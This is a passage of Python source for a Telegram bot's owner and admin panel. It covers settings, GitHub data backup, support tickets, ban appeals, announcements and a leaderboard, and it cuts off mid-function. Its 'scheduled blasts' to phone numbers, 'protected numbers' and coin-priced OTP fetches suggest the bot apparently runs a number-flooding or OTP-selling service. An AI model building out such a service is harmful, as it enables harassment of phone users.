        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_credits"] = c
    save()
    await state.clear()
    await m.answer(
        f"✅ Ref credits: {c}",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:refcoin")
async def settings_refcoin(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_ref_coins)
    await safe_edit(
        cq,
        f"{em(EMOJI_COIN, '🪙')} <b>Referral Coins</b>\n\nAmount:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_ref_coins)
async def settings_refcoin_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["ref_coins"] = c
    save()
    await state.clear()
    await m.answer(
        f"✅ Ref coins: {c}",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:otpcost")
async def settings_otpcost(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_otp_cost)
    await safe_edit(
        cq,
        f"{em(EMOJI_OTP, '🔐')} <b>OTP Cost</b>\n\nCoins per successful fetch:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_otp_cost)
async def settings_otpcost_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["otp_cost"] = c
    save()
    await state.clear()
    await m.answer(
        f"✅ OTP cost: {c} coins",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:otpfresh")
async def settings_otpfresh(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_otp_fresh)
    await safe_edit(
        cq,
        f"{em(EMOJI_CLOCK, '⏱')} <b>OTP Fresh Window</b>\n\n"
        f"Minutes (default 15):",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_otp_fresh)
async def settings_otpfresh_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        mins = int((m.text or "").strip())
        if mins < 1 or mins > 1440:
            raise ValueError
    except Exception:
        await m.answer(f"❌ 1-1440 minutes.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["otp_fresh_window"] = mins * 60
    save()
    await state.clear()
    await m.answer(
        f"✅ Fresh window: {mins} min",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:bonus")
async def settings_bonus(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_daily_bonus)
    await safe_edit(
        cq,
        f"{em(EMOJI_GIFT, '🎁')} <b>Daily Bonus</b>\n\nCredits per daily claim:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_daily_bonus)
async def settings_bonus_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    try:
        c = int((m.text or "").strip())
        if c < 0:
            raise ValueError
    except Exception:
        await m.answer(f"❌ Valid number.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["daily_bonus_credits"] = c
    save()
    await state.clear()
    await m.answer(
        f"✅ Daily bonus: {c} credits",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data == "owner:settings:maintmsg")
async def settings_maintmsg(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.set_maint_msg)
    cur = d.get("settings", {}).get("maintenance_msg", "")
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📢')} <b>Global Maintenance Message</b>\n\n"
        f"Current: <i>{esc(cur[:100])}</i>\n\n"
        f"Send new message:",
        kb([(sc("cancel"), "owner:settings")]),
    )

@R.message(S.set_maint_msg)
async def settings_maintmsg_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    txt = (m.text or "").strip()[:300]
    if not txt:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return
    d.setdefault("settings", {})["maintenance_msg"] = txt
    save()
    await state.clear()
    await m.answer(
        f"✅ Saved!",
        reply_markup=kb([(sc("back"), "owner:settings")]),
        parse_mode="HTML",
    )

# ============================================================
#  GITHUB CONNECT / SYNC / RESTORE
# ============================================================
@R.callback_query(F.data == "owner:gh:connect")
async def gh_connect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("Owner only", show_alert=True)
        except Exception:
            pass
        return
    await state.clear()
    await state.set_state(S.github_repo)
    try:
        await cq.answer()
    except Exception:
        pass
    await cq.message.answer(
        "🔗 <b>Connect GitHub repository</b>\n\n"
        "Send repository as <code>owner/repo</code> (e.g. <code>myname/mybot-data</code>).\n"
        "Use a private repository. Next, bot will ask for a fine-grained token with Contents read/write only.",
        parse_mode="HTML",
    )

@R.message(S.github_repo)
async def gh_connect_repo(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    repo = (m.text or "").strip().strip("/")
    if not re.fullmatch(r"[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+", repo):
        await m.answer("Invalid format. Send <code>owner/repo</code>.", parse_mode="HTML")
        return
    await state.update_data(gh_repo=repo)
    await state.set_state(S.github_token)
    await m.answer("Now send the GitHub fine-grained access token. It will not be sent to the log channel. After setup, revoke it from GitHub if you think it was exposed.")

@R.message(S.github_token)
async def gh_connect_token(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    token = (m.text or "").strip()
    if len(token) < 20 or any(ch.isspace() for ch in token):
        await m.answer("That token format doesn't look valid. Please send the token again, or /cancel.")
        return
    await state.update_data(gh_token=token)
    try:
        await m.delete()
    except Exception:
        pass
    await state.set_state(S.github_branch)
    await m.answer("Token received (message deletion attempted). Branch name? Send <code>main</code> if unsure.", parse_mode="HTML")

@R.message(S.github_branch)
async def gh_connect_branch(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    branch = (m.text or "").strip()
    if not re.fullmatch(r"[A-Za-z0-9_.\-/]+", branch) or ".." in branch:
        await m.answer("Invalid branch name. Try <code>main</code>.", parse_mode="HTML")
        return
    await state.update_data(gh_branch=branch)
    await state.set_state(S.github_file)
    await m.answer("Data filename in repo? Send <code>sanjipro_data.json</code> if unsure.", parse_mode="HTML")

@R.message(S.github_file)
async def gh_connect_file(m: Message, state: FSMContext):
    global GITHUB_TOKEN, GITHUB_REPO, GITHUB_BRANCH, GITHUB_FILE, GITHUB_ENABLED
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    filename = (m.text or "").strip().lstrip("/")
    if not filename or filename.startswith(".") or ".." in filename.split("/") or not re.fullmatch(r"[A-Za-z0-9_.\-/]+", filename):
        await m.answer("Invalid filename/path. Example: <code>sanjipro_data.json</code>.", parse_mode="HTML")
        return
    vals = await state.get_data()
    cfg = {"repo": vals["gh_repo"], "token": vals["gh_token"], "branch": vals["gh_branch"], "file": filename}
    try:
        with open(_GITHUB_CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f)
        try:
            os.chmod(_GITHUB_CONFIG_FILE, 0o600)
        except OSError:
            pass
        GITHUB_TOKEN, GITHUB_REPO = cfg["token"], cfg["repo"]
        GITHUB_BRANCH, GITHUB_FILE = cfg["branch"], cfg["file"]
        GITHUB_ENABLED = True
        await state.clear()
        pushed = await _github_push(d)
        if pushed:
            await m.answer(
                f"✅ GitHub connected and test sync succeeded.\n"
                f"Repo: <code>{esc(GITHUB_REPO)}</code>\n"
                f"Branch: <code>{esc(GITHUB_BRANCH)}</code>\n"
                f"File: <code>{esc(GITHUB_FILE)}</code>",
                parse_mode="HTML",
            )
        else:
            await m.answer(
                "⚠️ Settings saved locally, but test sync failed. "
                "Check that the repo exists, the branch is correct, "
                "and the token has Contents read/write permission."
            )
        log_audit(d, "github_configured", m.from_user.id,
                  f"repo={GITHUB_REPO} branch={GITHUB_BRANCH} file={GITHUB_FILE}")
    except Exception as e:
        await state.clear()
        await m.answer(f"❌ Could not save GitHub settings: {esc(str(e)[:120])}", parse_mode="HTML")

@R.callback_query(F.data == "owner:gh:sync")
async def gh_sync_cmd(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    if not GITHUB_ENABLED:
        try:
            await cq.answer("❌ GitHub not configured!", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer("📤 Pushing...")
    except Exception:
        pass
    try:
        pushed = await _github_push(d)
        if pushed:
            await cq.message.answer("✅ Data pushed to GitHub!", parse_mode="HTML")
        else:
            await cq.message.answer("❌ GitHub push failed. Check token permissions, repo, branch, file path.", parse_mode="HTML")
    except Exception as e:
        try:
            await cq.message.answer(f"❌ Push failed: {esc(str(e)[:100])}", parse_mode="HTML")
        except Exception:
            pass

@R.callback_query(F.data == "owner:gh:restore")
async def gh_restore_cmd(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    if not GITHUB_ENABLED:
        try:
            await cq.answer("❌ GitHub not configured!", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer("📥 Pulling...")
    except Exception:
        pass
    try:
        data = await _github_pull()
        if not data:
            await cq.message.answer("❌ No data on GitHub.", parse_mode="HTML")
            return
        global _DATA_CACHE, PROTECTED_NUMBERS
        _merge(data, _default_data())
        PROTECTED_NUMBERS = data.get("protected_numbers", {}) or {}
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        _DATA_CACHE = data
        await cq.message.answer("✅ Data restored from GitHub!", parse_mode="HTML")
    except Exception as e:
        try:
            await cq.message.answer(f"❌ Restore failed: {esc(str(e)[:100])}", parse_mode="HTML")
        except Exception:
            pass

# ============================================================
#  TEMPLATES (owner overview)
# ============================================================
@R.callback_query(F.data == "owner:templates:menu")
async def owner_templates_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    tpls = d.get("templates", {})
    total = sum(len(v) for v in tpls.values())
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '📝')} <b>Templates (Global)</b>\n\n"
        f"Total: <b>{total}</b>\n"
        f"Users with templates: <b>{len(tpls)}</b>",
        kb([(sc("back"), "owner:home")]),
    )

# ============================================================
#  SCHEDULED (owner overview + cancel)
# ============================================================
@R.callback_query(F.data == "owner:scheduled:menu")
async def owner_scheduled_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    scheds = d.get("scheduled", [])
    lines = [f"{em(EMOJI_CLOCK, '⏰')} <b>Scheduled Blasts</b>\n\nTotal: <b>{len(scheds)}</b>\n"]
    rows = []
    for i, s in enumerate(scheds[:15]):
        when = fmt_time(s.get("when", 0))
        num = mask_number(s.get("number", "?"))
        lines.append(f"{i + 1}. {when} → <code>{esc(num)}</code>")
        rows.append([btn(f"cancel #{i + 1}", f"owner:sched:del:{i}", EMOJI_CROSS, "🗑")])
    if not scheds:
        lines.append("<i>No scheduled blasts.</i>")
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    txt = "\n".join(lines)
    if len(txt) > 4000:
        txt = txt[:3990] + "\n<i>...</i>"
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("owner:sched:del:"))
async def owner_sched_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        i = int(cq.data.split(":")[-1])
    except Exception:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    scheds = d.get("scheduled", [])
    if 0 <= i < len(scheds):
        scheds.pop(i)
        d["scheduled"] = scheds
        save()
        try:
            await cq.answer("🗑 Cancelled")
        except Exception:
            pass
    await owner_scheduled_menu(cq, state)

# ============================================================
#  TICKETS (owner side)
# ============================================================
@R.callback_query(F.data.in_({"owner:tickets:menu", "admin:tickets:menu"}))
async def owner_tickets_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    prefix = "owner" if is_owner(uid, d) else "admin"
    open_t = [t for t in d.get("tickets", []) if t.get("status") == "open"]
    txt = (
        f"{em(EMOJI_BELL, '📩')} <b>Support Tickets</b>\n\n"
        f"Open: <b>{len(open_t)}</b> | Total: <b>{len(d.get('tickets', []))}</b>\n\n"
        f"<i>Tap a ticket to view thread and reply.</i>"
    )
    await safe_edit(
        cq, txt,
        InlineKeyboardMarkup(inline_keyboard=[
            *[row for row in _ticket_rows(d, prefix, open_t[:10])],
            [btn("back", f"{prefix}:home", EMOJI_GEAR, "🔙")],
        ]),
    )

def _ticket_rows(d, prefix, tickets):
    rows = []
    for t in tickets:
        tid = t["id"]
        uid = t["uid"]
        replies = len(d.get("ticket_replies", {}).get(tid, []))
        label = f"{tid[-6:]} · {uid} · {replies}r"
        rows.append([btn(label[:30], f"{prefix}:ticket:view:{tid}", EMOJI_BELL, "📩")])
    return rows

@R.callback_query(F.data.regexp(r"^(owner|admin):ticket:view:(.+)$"))
async def ticket_view_owner(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    parts = cq.data.split(":", 3)
    prefix = parts[0]
    tid = parts[3]
    t = find_ticket(d, tid)
    if not t:
        try:
            await cq.answer("❌ Ticket not found", show_alert=True)
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        ticket_view_text(d, tid, "owner"),
        ticket_view_kb(tid, is_owner=True),
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):ticket:reply:(.+)$"))
async def ticket_reply_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    parts = cq.data.split(":", 3)
    tid = parts[3]
    t = find_ticket(d, tid)
    if not t:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    await state.update_data(reply_ticket_id=tid)
    await state.set_state(S.ticket_reply_text)
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        f"{em(EMOJI_FILE, '✏️')} <b>Reply to ticket {esc(tid)}</b>\n\nType your reply:",
        kb([(sc("cancel"), f"owner:ticket:view:{tid}")]),
    )

@R.message(S.ticket_reply_text)
async def ticket_reply_do(m: Message, state: FSMContext):
    """Single reply handler — works for owner and user."""
    d = load()
    uid = m.from_user.id
    fsmd = await state.get_data()
    tid = fsmd.get("reply_ticket_id")
    txt = (m.text or "").strip()
    await state.clear()

    if not tid or not txt:
        await m.answer("❌ Empty.", parse_mode="HTML")
        return

    t = find_ticket(d, tid)
    if not t:
        await m.answer("❌ Ticket gone.", parse_mode="HTML")
        return

    # If owner/admin, they can reply to any ticket. If user, only own.
    is_owner_reply = is_admin(uid, d)
    if not is_owner_reply and t.get("uid") != uid:
        await m.answer("❌ Not your ticket.", parse_mode="HTML")
        return

    add_ticket_reply(d, tid, uid, txt)
    save()

    # notify other side
    other_uid = t.get("uid") if is_owner_reply else MAIN_OWNER
    try:
        await m.bot.send_message(
            other_uid,
            f"{em(EMOJI_BELL, '📩')} <b>Ticket reply</b>\n\n"
            f"🎫 <code>{tid}</code>\n"
            f"👤 from <code>{uid}</code>\n\n"
            f"💬 {esc(txt[:500])}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn(
                    "open ticket",
                    f"owner:ticket:view:{tid}" if is_owner_reply is False else f"user:ticket:view:{tid}",
                    EMOJI_BELL, "📩", style="primary",
                )]
            ]),
        )
    except Exception:
        pass

    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} Reply sent.",
        reply_markup=kb([
            (sc("view ticket"), f"owner:ticket:view:{tid}" if is_owner_reply else f"user:ticket:view:{tid}"),
        ]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):ticket:close:(.+)$"))
async def ticket_close(cq: CallbackQuery, state: FSMContext):
    d = load()
    viewer = cq.from_user.id
    if not is_admin(viewer, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    parts = cq.data.split(":", 3)
    tid = parts[3]
    t = find_ticket(d, tid)
    if not t:
        try:
            await cq.answer("❌")
        except Exception:
            pass
        return
    t["status"] = "closed"
    log_audit(d, "ticket_closed", viewer, tid)
    save()
    try:
        await cq.answer("✅ Closed")
    except Exception:
        pass
    # notify user
    try:
        await cq.bot.send_message(
            t["uid"],
            f"📩 <b>Ticket closed</b>\n\n"
            f"🎫 <code>{tid}</code>\n\n"
            f"<i>Open a new ticket if you need more help.</i>",
            parse_mode="HTML",
        )
    except Exception:
        pass
    prefix = "owner" if is_owner(viewer, d) else "admin"
    await safe_edit(
        cq,
        f"{em(EMOJI_CHECK, '✅')} Ticket {esc(tid)} closed.",
        kb([(sc("back"), f"{prefix}:tickets:menu")]),
    )

# ============================================================
#  APPEALS (owner)
# ============================================================
@R.callback_query(F.data == "owner:appeals:menu")
async def owner_appeals_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    appeals = d.get("appeals", [])
    open_a = [a for a in appeals if a.get("status") == "open"]
    txt = (
        f"{em(EMOJI_USER, '🔓')} <b>Ban Appeals</b>\n\n"
        f"Open: <b>{len(open_a)}</b> | Total: <b>{len(appeals)}</b>\n\n"
    )
    rows = []
    for a in open_a[-10:]:
        uid = a.get("uid", "?")
        ts = fmt_time(a.get("ts", 0))
        body = esc(a.get("text", "")[:100])
        txt += f"<code>{uid}</code> [{ts}]\n   {body}\n\n"
        rows.append([btn(f"unban {uid}", f"owner:appeals:unban:{uid}", EMOJI_CHECK, "✅")])
    if not open_a:
        txt += "<i>No open appeals.</i>"
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    txt = txt[:3990]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data.startswith("owner:appeals:unban:"))
async def owner_appeals_unban(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    target = int(cq.data.split(":")[-1])
    if target in d.get("banned", []):
        d["banned"].remove(target)
    d.get("ban_reasons", {}).pop(str(target), None)
    for a in d.get("appeals", []):
        if a.get("uid") == target:
            a["status"] = "resolved"
    save()
    try:
        await cq.answer("✅ Unbanned!")
    except Exception:
        pass
    try:
        await cq.bot.send_message(target, f"✅ Appeal accepted. You are unbanned.", parse_mode="HTML")
    except Exception:
        pass
    await owner_appeals_menu(cq, state)

# ============================================================
#  ANNOUNCEMENTS (owner)
# ============================================================
@R.callback_query(F.data == "owner:announce:menu")
async def owner_announce_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    ann = d.get("announcements", [])
    txt = f"{em(EMOJI_BELL, '📣')} <b>Announcements</b>\n\nTotal: <b>{len(ann)}</b>\n\n"
    for a in ann[-5:]:
        ts = fmt_time(a.get("ts", 0))
        txt += f"[{ts}] {esc(a.get('text', '')[:80])}\n\n"
    rows = [
        [btn("new", "owner:announce:new", EMOJI_PLUS, "➕")],
        [btn("clear all", "owner:announce:clear", EMOJI_CROSS, "🗑")],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    txt = txt[:3990]
    await safe_edit(cq, txt, InlineKeyboardMarkup(inline_keyboard=rows))

@R.callback_query(F.data == "owner:announce:new")
async def owner_announce_new(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.broadcast)
    await state.update_data(broadcast_mode="announcement")
    await safe_edit(
        cq,
        f"{em(EMOJI_BELL, '📣')} <b>New Announcement</b>\n\nSend message:",
        kb([(sc("cancel"), "owner:announce:menu")]),
    )

@R.callback_query(F.data == "owner:announce:clear")
async def owner_announce_clear(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    d["announcements"] = []
    save()
    try:
        await cq.answer("🗑 Cleared")
    except Exception:
        pass
    await owner_announce_menu(cq, state)

# ============================================================
#  USER GROUPS (owner overview)
# ============================================================
@R.callback_query(F.data == "owner:groups:menu")
async def owner_groups_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    groups = d.get("user_groups", {})
    txt = f"{em(EMOJI_USER, '👥')} <b>User Groups</b>\n\n"
    if not groups:
        txt += "<i>No groups defined yet.</i>\n\n"
        txt += "Coming soon: bulk add/deduct by group."
    else:
        for name, users in groups.items():
            txt += f"• <b>{esc(name)}</b> — {len(users)} users\n"
    txt = txt[:3990]
    await safe_edit(cq, txt, kb([(sc("back"), "owner:home")]))

# ============================================================
#  UPCOMING UPDATES — OWNER MANAGEMENT (Part 8 new)
# ============================================================
@R.callback_query(F.data == "owner:upcoming:menu")
async def upcoming_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    items = d.get("upcoming_updates", [])
    visible = d.get("upcoming_visible", True)
    txt = (
        f"{em(EMOJI_NEW, '🔮')} <b>Upcoming Updates</b>\n\n"
        f"Items: <b>{len(items)}</b>\n"
        f"Visibility: <b>{'🟢 VISIBLE' if visible else '🔴 HIDDEN'}</b>\n\n"
        f"<i>These appear on user panel via 'coming soon' button.</i>\n\n"
    )
    for it in items[:10]:
        txt += f"• <b>{esc(it.get('title', '?'))}</b>\n"
        if it.get("eta"):
            txt += f"   ⏱ ETA: {esc(it.get('eta'))}\n"
        txt += f"   {esc(it.get('description', '')[:100])}\n\n"
    if len(items) > 10:
        txt += f"<i>+{len(items) - 10} more</i>"
    await safe_edit(cq, txt, upcoming_menu_kb(d))

@R.callback_query(F.data == "owner:upcoming:add")
async def upcoming_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await state.set_state(S.upcoming_title)
    await safe_edit(
        cq,
        f"{em(EMOJI_NEW, '🔮')} <b>Add Upcoming Update</b>\n\n"
        f"Step 1/3: Title (short):",
        kb([(sc("cancel"), "owner:upcoming:menu")]),
    )

@R.message(S.upcoming_title)
async def upcoming_title_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    title = (m.text or "").strip()[:80]
    if not title:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return
    await state.update_data(upcoming_title=title)
    await state.set_state(S.upcoming_description)
    await m.answer(f"Step 2/3: Description (max 500):", parse_mode="HTML")

@R.message(S.upcoming_description)
async def upcoming_desc_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    desc = (m.text or "").strip()[:500]
    if not desc:
        await m.answer(f"❌ Empty.", parse_mode="HTML")
        return
    await state.update_data(upcoming_description=desc)
    await state.set_state(S.upcoming_eta)
    await m.answer(
        f"Step 3/3: ETA (optional, e.g. 'Feb 2026', or send <code>skip</code>):",
        parse_mode="HTML",
    )

@R.message(S.upcoming_eta)
async def upcoming_eta_done(m: Message, state: FSMContext):
    d = load()
    if not is_owner(m.from_user.id, d):
        await state.clear()
        return
    eta = (m.text or "").strip()
    if eta.lower() == "skip":
        eta = ""
    eta = eta[:40]
    fsmd = await state.get_data()
    title = fsmd.get("upcoming_title", "")
    desc = fsmd.get("upcoming_description", "")
    if not title or not desc:
        await state.clear()
        await m.answer(f"❌ Expired.", parse_mode="HTML")
        return
    item = upcoming_add(d, title, desc, eta)
    log_audit(d, "upcoming_add", m.from_user.id, item["id"])
    save()
    await state.clear()
    await m.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Added</b>\n\n"
        f"🔮 {esc(title)}\n"
        f"{esc(desc)}\n"
        f"{'⏱ ETA: ' + esc(eta) if eta else ''}",
        reply_markup=kb([(sc("back"), "owner:upcoming:menu")]),
        parse_mode="HTML",
    )

@R.callback_query(F.data.startswith("owner:upcoming:del:"))
async def upcoming_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    item_id = cq.data.split("owner:upcoming:del:", 1)[1]
    ok = upcoming_remove(d, item_id)
    if ok:
        log_audit(d, "upcoming_del", cq.from_user.id, item_id)
        save()
        try:
            await cq.answer("🗑 Removed!")
        except Exception:
            pass
    else:
        try:
            await cq.answer("❌ Not found")
        except Exception:
            pass
    await upcoming_menu(cq, state)

@R.callback_query(F.data == "owner:upcoming:toggle")
async def upcoming_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    d["upcoming_visible"] = not d.get("upcoming_visible", True)
    save()
    try:
        await cq.answer(f"{'🟢 Visible' if d['upcoming_visible'] else '🔴 Hidden'} on user panel", show_alert=True)
    except Exception:
        pass
    await upcoming_menu(cq, state)

# ============================================================
#  LEADERBOARD — owner view (feature 8 owner side)
# ============================================================
@R.callback_query(F.data == "owner:leaderboard:menu")
async def owner_leaderboard(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    await safe_edit(
        cq,
        leaderboard_text(d, "all"),
        leaderboard_kb("owner", "all"),
    )

@R.callback_query(F.data.regexp(r"^owner:lb:show:(7d|30d|all)$"))
async def owner_lb_show(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer()
    except Exception:
        pass
    period = cq.data.split(":")[-1]
    await safe_edit(cq, leaderboard_text(d, period), leaderboard_kb("owner", period))

# ============================================================
#  EXPORT SCRIPT
# ============================================================
@R.callback_query(F.data == "owner:export_script")
async def export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        try:
            await cq.answer("🚫")
        except Exception:
            pass
        return
    try:
        await cq.answer("📤...")
    except Exception:
        pass
    try:
        sp = os.path.abspath(__file__)
        await cq.message.reply_document(
            document=FSInputFile(sp),
            caption=f"📤 <b>{_VERSION}</b>",
            parse_mode="HTML",
        )
    except Exception:
        pass

# ============================================================
#  ADMIN JSON DATA IMPORT (fix: bounded size, protected fields)
# ============================================================
@R.callback_query(F.data == "admin:data:import")
async def admin_data_import_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        try:
            await cq.answer("Admin only", show_alert=True)
        except Exception:
            pass
        return
    await state.clear()
    await state.set_state(S.import_data_file)
    try:
        await cq.answer()
    except Exception:
        pass
    await cq.message.answer(
        "📥 <b>Add data from JSON</b>\n\n"
        "Send a valid <code>.json</code> document, max 5MB.\n\n"
        "Importer additively merges: new keys/items are added, existing values and user records are preserved, duplicate list items skipped.\n\n"
        "Protected: admin/owner lists, credentials/tokens, bot settings, Firebase config.",
        parse_mode="HTML",
        reply_markup=kb([(sc("cancel"), "admin:home")]),
    )

def _json_import_signature(value):
